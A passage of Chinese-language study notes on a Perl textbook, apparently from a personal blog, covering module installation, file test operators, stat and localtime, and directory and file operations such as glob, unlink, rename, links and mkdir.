line:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>perl -<span class="hljs-symbol">Mlocal:</span>:<span class="hljs-class"><span class="hljs-keyword">lib</span></span><br></code></pre></td></tr></table></figure><h1 id="第十一章-Perl-模块-重读"><a href="#第十一章-Perl-模块-重读" class="headerlink" title="第十一章 Perl 模块 (重读)"></a>第十一章 Perl 模块 (重读)</h1><p>绝大部分 Perl 5 代码都是以模块的形式存在的.</p><h2 id="寻找模块"><a href="#寻找模块" class="headerlink" title="寻找模块"></a>寻找模块</h2><p>Perl 模块有两种来源:</p><ul><li>随 Perl 发行版本一同打包</li><li>从 CPAN 下载</li></ul><p>可使用 <code>perldoc</code> 命令打开模块的文档.</p><p>Perl 自带的 <code>cpan</code> 命令可以创建 autobundle 文件. 其会列出所有已经安装了的模块, 包括版本号:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan -a<br></code></pre></td></tr></table></figure><h2 id="安装模块"><a href="#安装模块" class="headerlink" title="安装模块"></a>安装模块</h2><p>具体查看模块包的 README 文件或 INSTALL 文件.</p><p>Perl 的一个自带的模块 <code>ExtUtils:MakeMaker</code> 其提供的一系列工具可以帮忙生成模块安装文件.</p><p>使用 MakeMaker 封装:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Makefile.PL<br>$ make install<br></code></pre></td></tr></table></figure><p>可指定安装目录:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl MakeMaker.PL INSTALL_BASE=/Users/fred/lib<br></code></pre></td></tr></table></figure><p>有些模块的工作依赖于其他模块, 所以必须先安装好这些前置模块, 才能继续编译安装.</p><p>扩展名 <code>.pm</code> 表示 <code>Perl Module</code>.</p><p>安装模块, 可以用 <code>cpan + 包名</code> 如:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan Module::CoreList<br></code></pre></td></tr></table></figure><h3 id="安装到自己的目录"><a href="#安装到自己的目录" class="headerlink" title="安装到自己的目录"></a>安装到自己的目录</h3><p>CPAN 工具默认会把模块装到与 perl 解释器相同的目录.</p><p>使用 <code>local::lib</code> 模块, 可以将新模块安装到自己的用户目录下.</p><p>列出 <code>local::lib</code> 模块所改动的所有环境变量设定:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -Mlocal::lib<br></code></pre></td></tr></table></figure><p>使用 <code>-I</code> 参数, 就可以根据 <code>local::lib</code> 修改的环境变量来安装模块:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ cpan -I Set::Crossproduct<br></code></pre></td></tr></table></figure><p>可以在 CPAN.pm 配置中设定一些参数.</p><p>可以用:</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-keyword">use</span> <span class="hljs-keyword">local</span>::<span class="hljs-keyword">lib</span><br></code></pre></td></tr></table></figure><p>来告诉程序在哪里找模块.</p><h2 id="使用简易模块"><a href="#使用简易模块" class="headerlink" title="使用简易模块"></a>使用简易模块</h2><p>Unix 上的文件或目录名称可能会包含换行符.</p><p><code>\s</code> 选项可以修正 <code>.</code> 无法匹配换行符的问题.</p><h3 id="File-Basename-模块"><a href="#File-Basename-模块" class="headerlink" title="File::Basename 模块"></a>File::Basename 模块</h3><p>使用:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc File::Basename<br></code></pre></td></tr></table></figure><p>可以查看文档.</p><p>加载模块:</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">use <span class="hljs-built_in">File</span>::Basename<br></code></pre></td></tr></table></figure><p>其提供的 <code>basename</code> 函数用于获取文件的 basename.</p><p><code>dirname</code> 函数用于获取目录名称.</p><h3 id="仅选用模块中的部分函数"><a href="#仅选用模块中的部分函数" class="headerlink" title="仅选用模块中的部分函数"></a>仅选用模块中的部分函数</h3><p>需要加上一个导入列表:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use <span class="hljs-keyword">File</span>::Basename qw<span class="hljs-regexp">/ basename /</span>;<br></code></pre></td></tr></table></figure><p>写成:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">use <span class="hljs-keyword">File</span>::Basename qw<span class="hljs-regexp">/ /</span>;<br></code></pre></td></tr></table></figure><p>或:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> <span class="hljs-title class_">File</span>::<span class="hljs-title class_">Basename</span> ();<br></code></pre></td></tr></table></figure><p>表示在加载模块的同时不导入函数名称, 意思就是只能用全称的方式来引用, 如:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir">my <span class="hljs-variable">$name</span> = <span class="hljs-title class_">File</span>::<span class="hljs-title class_">Basename</span>::dirname <span class="hljs-variable">$name</span>;<br></code></pre></td></tr></table></figure><h3 id="File-Spec-模块"><a href="#File-Spec-模块" class="headerlink" title="File::Spec 模块"></a>File::Spec 模块</h3><p>File::Spec 是 file specification.</p><p>使用 <code>catfile</code> 这个 method, 方法的调用需要使用全名:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-keyword">use</span> <span class="hljs-title class_">File</span>::<span class="hljs-title class_">Spec</span><br><br>my <span class="hljs-variable">$new_name</span> = <span class="hljs-title class_">File</span>::<span class="hljs-title class_">Spec</span>-&gt;catfiel(<span class="hljs-variable">$dirname</span>, <span class="hljs-variable">$basename</span>);<br></code></pre></td></tr></table></figure><p>这里模块称为类 (class), 且使用 <code>-&gt;</code>.</p><h3 id="Path-Class-模块"><a href="#Path-Class-模块" class="headerlink" title="Path::Class 模块"></a>Path::Class 模块</h3><p>见书或者 perldoc.</p><h3 id="CGI-pm-模块"><a href="#CGI-pm-模块" class="headerlink" title="CGI.pm 模块"></a>CGI.pm 模块</h3><p>创建 CGI 程序时, 最好直接使用 <code>CGI.pm</code> 模块.</p><p>在导入列表中使用 <code>:all</code> (一种导出标签 export tag 写法), 导出一组函数.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#! /usr/bin/perl</span><br><br><span class="hljs-keyword">use</span> CGI <span class="hljs-string">qw(:all)</span>;<br><br><span class="hljs-keyword">print</span> header(<span class="hljs-string">&quot;text/plain&quot;</span>);<br><br><span class="hljs-keyword">foreach</span> $param ( param() ) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;$param: &quot;</span> . param($param) . <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数据库和-DBI-模块"><a href="#数据库和-DBI-模块" class="headerlink" title="数据库和 DBI 模块"></a>数据库和 DBI 模块</h3><p>DBI (Database Interface, 数据库接口) 模块. 具体查看 &lt;<Programmingthe Perl DBI>&gt; 这本书.</p><p>DBI 模块的 <a href="http://dbi.perl.org/">官网</a> </p><p>安装了 DBI 之后, 还需要安装 DBD (Database Driver, 数据库驱动程序). 可在 CPAN 上搜索 DBD.</p><h3 id="处理日期和时间的模块"><a href="#处理日期和时间的模块" class="headerlink" title="处理日期和时间的模块"></a>处理日期和时间的模块</h3><p>使用 DateTime 模块.</p><p>更简便的是使用 Time::Piece 模块, 其会重载 Perl 内置的 localtime 函数, 返回一个时间对象:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Time::Piece<br><br><span class="hljs-keyword">my</span> $t = <span class="hljs-keyword">localtime</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;The month is &#x27;</span> . $t-&gt;month . <span class="hljs-string">&quot;\n&quot;</span>;<br></code></pre></td></tr></table></figure><p>从 Perl 5.10 起, Time::Piece 模块为 Perl 自带.</p><h1 id="第十二章-文件测试"><a href="#第十二章-文件测试" class="headerlink" title="第十二章 文件测试"></a>第十二章 文件测试</h1><h2 id="文件测试操作符号"><a href="#文件测试操作符号" class="headerlink" title="文件测试操作符号"></a>文件测试操作符号</h2><p>绝大多数测试操作符返回布尔真假值.</p><p>它们相应的文档写在 perlfunc 里面.</p><p>查看完整清单:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perldoc -f -X<br></code></pre></td></tr></table></figure><p>这里就是 <code>X</code>.</p><p><code>-e</code> 判断是否存在.</p><p><code>-M</code> 判断更新.</p><p>列表:<br><img src="/../img/file_test_ope1.png"></p><p><img src="/../img/file_test_ope2.png"></p><p>Unix 文件系统上有且仅有 7 种文件类型. 可分别由以下 7 种文件测试操作符代表: <code>-f</code>, <code>-d</code>, <code>-l</code>, <code>-S</code>, <code>-p</code>, <code>-b</code>, <code>-c</code>.</p><p>文件时间测试符, <code>-M</code>, <code>-A</code>, <code>-C</code> 分别返回从该文件最后一次被修改, 被访问或者它的 inode 被更改后到现在的天数. 具体细节可查看系统函数 <code>stat</code> 的文档.</p><p>天数的值用浮点数表示.</p><p>检查文件的时间记录时, 可能会得到 <code>-1.2</code> 这样的负数, 这表示文集那最后一次被访问的时间戳是在未来 30 小时后. 程序开始运行的那一刻会被记录下来作为检查时间的原点. 因此负值可能表示已经运行很久的程序找到某个刚刚才被访问过得文件.</p><p><code>-T</code> 和 <code>-B</code> 测试某个文件是文本文件还是二进制文件.  如果文件不存在, 都为假. 文件为空都为真.</p><p><code>-t</code>, 如果被测试的文件句柄是一个 TTY 设备, 返回真.</p><p>如果文件测试操作符后面没写文件名或文件句柄, 那么默认的操作数就是 <code>$_</code> 里的文件名.</p><p>可以有这样的写法:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $size_in_k = (-s) / <span class="hljs-number">1024</span>; <br></code></pre></td></tr></table></figure><h2 id="测试同一文件的多项属性"><a href="#测试同一文件的多项属性" class="headerlink" title="测试同一文件的多项属性"></a>测试同一文件的多项属性</h2><p>结合 <code>and</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (-r $file <span class="hljs-keyword">and</span> -w $file) &#123;<br>    ...<br>&#125; <br></code></pre></td></tr></table></figure><p>这种写法比较消耗资源.</p><p>使用虚拟文件句柄 <code>_</code>, 其告诉 Perl 使用上次查询过的文件信息来做当前测试:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (-r $file -w <span class="hljs-number">_</span>) &#123;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>或分开写:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">if</span> (-r $file) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The file is readable!\n&quot;</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (-w <span class="hljs-number">_</span>) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The file is writable!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="栈式文件测试操作符"><a href="#栈式文件测试操作符" class="headerlink" title="栈式文件测试操作符"></a>栈式文件测试操作符</h2><p>在 Perl 5.10 之后, 可以这样测试:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.010</span>;<br><br><span class="hljs-keyword">if</span> (-w -r $file) &#123;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;The file is both readable and writable!\n&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>不用分开写, 靠近文件名的测试会先执行, 次序为从右往左, 这种叫做 <mark>栈式写法</mark>.</p><h2 id="stat-和-lstat-函数"><a href="#stat-和-lstat-函数" class="headerlink" title="stat 和 lstat 函数"></a>stat 和 lstat 函数</h2><p><code>stat</code> 函数能返回和同名的 Unix 系统调用 stat 近乎一样丰富的文件信息.</p><p><code>stat</code> 函数的参数可以是文件句柄, 或是某个会返回文件名的表达式.</p><p><code>stat</code> 函数执行失败, 会返回空列表, 或是一个含 13 个元素的数字列表. 具体含义见书.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span>($dev, $ino, $mode, $nlink, $uid, $gid, $rdev, $size, $atime, $mtime, $ctime, $blksize, $blocks) = <span class="hljs-keyword">stat</span>($filename);<br></code></pre></td></tr></table></figure><h2 id="localtime-函数"><a href="#localtime-函数" class="headerlink" title="localtime 函数"></a>localtime 函数</h2><p>在标量上下文中:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $timestamp = <span class="hljs-number">1180630098</span>;<br><span class="hljs-keyword">my</span> $date = <span class="hljs-keyword">localtime</span> $timestamp;<br></code></pre></td></tr></table></figure><p>在列表上下文中返回列表:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span>($sec, $min, $day, $mon, $year, $wday, $yday, $isdest) = <span class="hljs-keyword">localtime</span> $timestamp;<br></code></pre></td></tr></table></figure><p><code>gmtime</code> 函数返回世界标准时间.</p><p>默认情况下,  <code>localtime</code> 函数和 <code>gmtime</code> 函数都使用当前 <code>time</code> 返回的时间值.</p><h2 id="按位运算操作符"><a href="#按位运算操作符" class="headerlink" title="按位运算操作符"></a>按位运算操作符</h2><p>如对 stat 函数返回的权限位进行处理.</p><p>基本和 C 语言相同.</p><p>如下:<br><img src="/../img/binary_ope.png"></p><h2 id="使用位字符串"><a href="#使用位字符串" class="headerlink" title="使用位字符串"></a>使用位字符串</h2><p>假如按位运算操作符的任一操作数是字符串, 则 Perl 会把它当成位字符串来处理.</p><p>如, “\xAA”|”\x55” 的结果会是 “\xFF”.</p><p>了解利用按位运算操作符处理位字符串的细节, 参阅 perlop 文档.</p><h1 id="第13章-目录操作"><a href="#第13章-目录操作" class="headerlink" title="第13章 目录操作"></a>第13章 目录操作</h1><h2 id="在目录树中移动"><a href="#在目录树中移动" class="headerlink" title="在目录树中移动"></a>在目录树中移动</h2><p>使用 <code>chdir</code> 操作符来改变当前的工作目录. 和 Unix shell 的 cd 命令差不多:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chdir</span> <span class="hljs-string">&#x27;/etc&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;cannot chdir to /etc: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>发生错误时会设置标量变量 <code>$!</code>.</p><p>由 Perl 程序启动的所有进程都会继承 Perl 程序的工作目录.</p><p>工作目录的更改无法影响调用 Perl 程序的进程. 意思是, 你用 shell 调用 Perl 程序, 尽管这个 Perl 程序改变了工作目录, 但是 Perl 程序退出后, 又会回到原来的工作目录.</p><p>可以用 <code>File::HomeDir</code> 模块, 指定进入用户的主目录.</p><h2 id="文件名通配"><a href="#文件名通配" class="headerlink" title="文件名通配"></a>文件名通配</h2><p>使用 <code>glob</code> 操作符:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @all_files = <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*&#x27;</span>;<br><span class="hljs-keyword">my</span> @pm_files = <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*.pm&#x27;</span>;<br></code></pre></td></tr></table></figure><p>其中 <code>@all_files</code> 会取得当前目录中的所有文件并按字母顺序排序, 不包括以点号开头的文件.</p><p>所有能在命令行上键入的模式都可以作为 (唯一的) 参数交给 <code>glob</code> 处理:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @all_files_includeing_dot = <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;.* *&#x27;</span><br></code></pre></td></tr></table></figure><p>在 Perl 5.6 之前, <code>glob</code> 操作符只是在后台调用 <code>/bin/csh</code> 来展开文件名.</p><h2 id="文件名通配的另一种语法"><a href="#文件名通配的另一种语法" class="headerlink" title="文件名通配的另一种语法"></a>文件名通配的另一种语法</h2><p>在出现 <code>glob</code> 操作符之前的写法:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @all_files = &lt;*&gt;;<br><span class="hljs-keyword">my</span> $dir = <span class="hljs-string">&#x27;/etc&#x27;</span>;<br><span class="hljs-keyword">my</span> @dir_files = &lt;$dir/* $dir/.*&gt;;<br></code></pre></td></tr></table></figure><h2 id="目录句柄-directory-handle"><a href="#目录句柄-directory-handle" class="headerlink" title="目录句柄 (directory handle)"></a>目录句柄 (directory handle)</h2><p>和文件句柄使用起来没多大差别.</p><p>用 <code>opendir</code> 打开, 用 <code>readdir</code> 读取, 用 <code>closedir</code> 关闭. 操作的是目录里的文件名, 而不是文件内容.</p><p>目录句柄会在程序结束时自动关闭.</p><p><code>readdir</code> 操作符返回的文件名并不含路径名, 只是目录里的文件名. 只有加上路径名称才有办法得到文件的全名.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">opendir</span> <span class="hljs-keyword">my</span> $somedir, $dirname <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot open $dirname: $!&quot;</span>;<br><span class="hljs-keyword">while</span> (<span class="hljs-keyword">my</span> $name = <span class="hljs-keyword">readdir</span> $somedir) &#123;<br>    <span class="hljs-keyword">next</span> <span class="hljs-keyword">if</span> $name =~ <span class="hljs-regexp">/^\./</span>;<br>    $name = <span class="hljs-string">&quot;$dirname/$name&quot;</span>;<br>    <span class="hljs-keyword">next</span> <span class="hljs-keyword">unless</span> -f $name <span class="hljs-keyword">and</span> -r $name;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>可以使用 <code>File::Spec::Functions</code> 或 <code>Path::Class</code> 模块构造用于本地系统的合适文件名.</p><h2 id="递归访问目录"><a href="#递归访问目录" class="headerlink" title="递归访问目录"></a>递归访问目录</h2><p>Perl 的 <code>File::Find</code> 或 <code>File::Find::Rule</code> 或 <code>File::Finder</code> 模块可以实现 Unix 下的 find 命令.</p><h2 id="文件和目录的操作"><a href="#文件和目录的操作" class="headerlink" title="文件和目录的操作"></a>文件和目录的操作</h2><h3 id="删除文件"><a href="#删除文件" class="headerlink" title="删除文件"></a>删除文件</h3><p>使用 <code>unlink</code> 操作符, 并指定要删除的文件列表.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unlink</span> <span class="hljs-string">&#x27;slate&#x27;</span>, <span class="hljs-string">&#x27;bedrock&#x27;</span>, <span class="hljs-string">&#x27;lava&#x27;</span>;<br><span class="hljs-keyword">unlink</span> <span class="hljs-string">qw(slate bedrock lava)</span>;<br></code></pre></td></tr></table></figure><p>可以配合 <code>glob</code> 使用:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">unlink</span> <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*.o&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>unlink</code> 的返回值代表成功删除的文件数目.</p><p>可以使用循环:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $file (<span class="hljs-string">qw(slate bedrock lava)</span>) &#123;<br>    <span class="hljs-keyword">unlink</span> $file <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;Failed on $file: $!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>unlink</code> 不能用来删除目录. 删除目录要使用 <code>rmdir</code>.</p><p>删除文件的权限跟文件本身的权限位无关, 其取决于文件所在目录的权限位.</p><h3 id="重命名文件"><a href="#重命名文件" class="headerlink" title="重命名文件"></a>重命名文件</h3><p>使用 <code>rename</code> 函数. 相当与命令行下的 <code>mv</code>.</p><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">rename</span> <span class="hljs-string">&#x27;old&#x27;</span>, <span class="hljs-string">&#x27;new&#x27;</span>;<br></code></pre></td></tr></table></figure><p>可以移到不同目录:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">rename</span> <span class="hljs-string">&#x27;over_there/some/place/some_file&#x27;</span>, <span class="hljs-string">&#x27;some_file&#x27;</span>;<br></code></pre></td></tr></table></figure><p>可以不用逗号而用 <code>=&gt;</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">rename</span> <span class="hljs-string">&#x27;over_there/some/place/some_file&#x27;</span> =&gt; <span class="hljs-string">&#x27;some_file&#x27;</span>;<br></code></pre></td></tr></table></figure><p>批量把名称以 <code>.old</code> 结尾的文件改名为 <code>.new</code> 结尾:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $file (<span class="hljs-keyword">glob</span> <span class="hljs-string">&quot;*.old&quot;</span>) &#123;<br>    <span class="hljs-keyword">my</span> $newfile = $file;<br>    $newfile =~ <span class="hljs-regexp">s/\.old$/.new/</span>;<br>    <span class="hljs-keyword">if</span> (-e $newfile) &#123;<br>        <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;can&#x27;t rename $file to $newfile: $newfile exists\n&quot;</span>;<br>    &#125; <span class="hljs-keyword">elsif</span> (<span class="hljs-keyword">rename</span> $file =&gt; $newfile) &#123;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;rename $file to $newfile failed: $!\n&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="链接与文件"><a href="#链接与文件" class="headerlink" title="链接与文件"></a>链接与文件</h3><p>目录是一种由系统管理的特殊文件, 基本上目录是一份文件名和相应 inode 编号的对照表. <code>ls -i</code> 可查看 inode.</p><p>判断一个 inode 是否可用, 利用 inode 的链接数 (link count). 如果 inode 并未在任何目录里出现, 它的链接数就一定是零.</p><p>所有链接数为零的 inode 都可以用来存放新文件.</p><p>任何目录的链接数都至少是 2 :一个位于它的上层目录的列表里, 另一个位于它本身的列表里.</p><p>利用 Perl 中的 <code>link</code> 函数建立新的链接:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">link</span> <span class="hljs-string">&#x27;chicken&#x27;</span>, <span class="hljs-string">&#x27;egg&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;can&#x27;t link chicken to egg: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>和命令行下的 <code>ln chicken egg</code> 效果类似. 这是硬链接. 如果删除了 chichen 文件, 文件里的数据并不会丢失, 还可以用 egg 这个文件名来访问.</p><p>目录列表的硬链接还有一条规定: 在目录列表中所有 inode 指向的文件都必须在同一个挂载卷中.</p><p><code>rename</code> 虽然可以将文件移到别的目录里, 但是来源和目的地必须位于同一个文件系统 (挂载卷) 上.</p><p>软链接 (symbolic link):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">symlink</span> <span class="hljs-string">&#x27;dodgson&#x27;</span>, <span class="hljs-string">&#x27;carroll&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;can&#x27;t symlink dodgson to carroll: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>符号链接是创建了新的 inode.</p><p>取得符号链接指向的位置, 使用 <code>readlink</code> 函数:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $where = <span class="hljs-keyword">readlink</span> <span class="hljs-string">&#x27;carroll&#x27;</span>;<br><br><span class="hljs-keyword">my</span> $perl = <span class="hljs-keyword">readlink</span> <span class="hljs-string">&#x27;/usr/local/bin/perl&#x27;</span>;<br></code></pre></td></tr></table></figure><p>两种链接都可以用 <code>unlink</code> 移除.</p><h2 id="创建和删除目录"><a href="#创建和删除目录" class="headerlink" title="创建和删除目录"></a>创建和删除目录</h2><p>使用 <code>mkdir</code> 目录创建:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">mkdir</span> <span class="hljs-string">&#x27;fred&#x27;</span>, <span class="hljs-number">0755</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;Cannot make fred directory: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>注意这里用的是八进制数.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $name = <span class="hljs-string">&#x27;fred&#x27;</span>;<br><span class="hljs-keyword">my</span> $permissions = <span class="hljs-string">&quot;0755&quot;</span>;<br><span class="hljs-keyword">mkdir</span> $name, <span class="hljs-keyword">oct</span>($permissions) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot create $name: $!&quot;</span>;<br></code></pre></td></tr></table></figure><p>移除空目录直接用 <code>rmdir</code>, 每次调用只能删除一个目录:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">foreach</span> <span class="hljs-keyword">my</span> $dir <span class="hljs-string">qw(fred barbey betty)</span> &#123;<br>    <span class="hljs-keyword">rmdir</span> $dir <span class="hljs-keyword">or</span> <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;Cannot rmdir $dir: $!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>删除非空目录之前, 先用 <code>unlink</code> 删除目录中的内容.</p><p>进程号, 存在 <code>$$</code> 中.</p><p>可以参考 <code>File::Path</code> 模块中的 <code>rmtree</code> 函数.</p><h2 id="修改权限"><a href="#修改权限" class="headerlink" title="修改权限"></a>修改权限</h2><p>使用 perl 中的 <code>chmod</code> 函数:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 